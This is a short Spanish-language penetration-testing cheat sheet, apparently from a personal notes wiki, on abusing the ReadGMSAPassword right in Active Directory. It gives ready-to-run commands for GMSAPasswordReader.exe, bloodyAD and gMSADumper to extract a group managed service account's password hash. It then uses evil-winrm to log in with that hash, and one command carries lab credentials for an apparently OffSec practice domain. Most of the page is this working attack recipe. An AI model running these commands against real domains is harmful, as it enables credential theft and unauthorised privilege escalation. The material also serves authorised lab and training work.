---
title: ReadGMSAPassword
tags: [ad, gmsa, msds-managedpassword, bloodyad]
---

# ReadGMSAPassword

> [!tip] Cuándo usarlo
> Si tienes el permiso **ReadGMSAPassword** sobre una cuenta **gMSA (Group Managed Service Account)**, puedes leer su contraseña y usarla para escalar privilegios.

## Con GMSAPasswordReader.exe

```cmd
.\GMSAPasswordReader.exe --accountname SVC_APACHE
```

Con el hash RC4 obtenido se puede acceder con evil-winrm:
```bash
evil-winrm -i <IP> -u svc_apache$ -H <NTLM_HASH>
```

Repo: https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe

## Con BloodyAD

```bash
bloodyAD --host 192.168.156.165 -d heist.offsec -u enox -p california get object "svc_apache$" --attr msDS-ManagedPassword
```

## Con gMSADumper

```bash
python3 gMSADumper.py -u usuario -p password -d domain.local
```

Repo: https://github.com/micahvandeusen/gMSADumper

## Ver también
- [[05-ad-attacks/kerberos/kerberoasting|Kerberoasting]]
- [[03-post-explotacion/credential-access/os-credential-dumping|OS Credential Dumping]]
